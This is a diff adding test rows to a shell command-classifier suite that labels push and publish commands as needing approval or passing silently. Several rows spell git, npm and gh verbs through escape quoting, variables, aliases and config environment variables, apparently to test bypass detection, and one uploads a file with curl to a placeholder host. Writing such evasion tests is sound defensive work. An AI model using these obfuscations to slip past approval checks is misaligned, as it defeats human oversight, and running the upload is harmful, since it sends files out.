@@ -1561,6 +1561,46 @@ ask@git push --dry-run origin {--no-dry-run,main}
 ask@git push --repo --dry-run origin main
 norec@npm publish --dry-run false
 norec@npm publish --dry-run --dry-run=false
+ask@git pu$'s'h origin main
+ask@git pu$'\\U00000073'h origin main
+ask@npm $'publish'
+ask@gh pr $'create'
+ask@git pu$'\\x73\\x00junk'h origin main
+ask@np$'\\x6d' publish
+ask@$G push origin main
+ask@git -C \"my dir\" $X origin main
+ask@git -C 'my dir' $X origin main
+ask@git -c \"user.name=a b\" $X origin main
+ask@git -C \"a;b\" $X origin main
+ask@gh -R o/r pr $C
+ask@git --git-dir \"a b\" $X origin main
+ask@sudo git $X origin main
+ask@{ git $X origin main; }
+ask@if git $X origin main; then :; fi
+ask@npm --silent $X
+ask@docker --context default $X img
+ask@cargo +nightly $X
+ask@git -c ALIAS.x=push x origin main
+ask@git --config-env=alias.x=V x origin main
+ask@GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0=push git x origin main
+ask@shopt -s extglob\ngit @(push) origin main
+ask@aws s3 $OP f s3://b/
+ask@gsutil $OP f gs://b/
+ask@npm --silent publish
+ask@yarn --cwd d publish
+ask@docker --context default push img
+ask@docker -H unix:///x push img
+ask@cargo +nightly publish
+ask@uv --directory d publish
+ask@poetry -C d publish
+ask@gem -q push x.gem
+ask@gsutil -m cp f gs://b/
+ask@aws --profile p s3 cp f s3://b/
+ask@git push -fo --dry-run origin main
+ask@git push -uo --dry-run origin main
+ask@git push --rep --dry-run origin main
+ask@git push --push-opt --dry-run origin main
+norec@curl -T$F https://example.invalid/up
 silent@git push --dry-run origin HEAD
 silent@git log --format=$FMT
 silent@grep -rn push docs/
@@ -1576,6 +1616,13 @@ silent@npm run $SCRIPT
 silent@uv run pytest $ARGS
 silent@git commit -m \"fix: a typo\"
 silent@echo x > C:\\\\repo\\\\notes.md
+silent@make -C docker $TARGET
+silent@find . -path ./git -prune -o -name '*.py' -print
+silent@ls docker *.yml
+silent@aws s3 ls $BUCKET
+silent@docker run $IMG
+silent@npm run build -- --flag=$X
+silent@rsync --dry-run -a src/ host:dst
 ROWS
 }
 for _rec in none clean; do
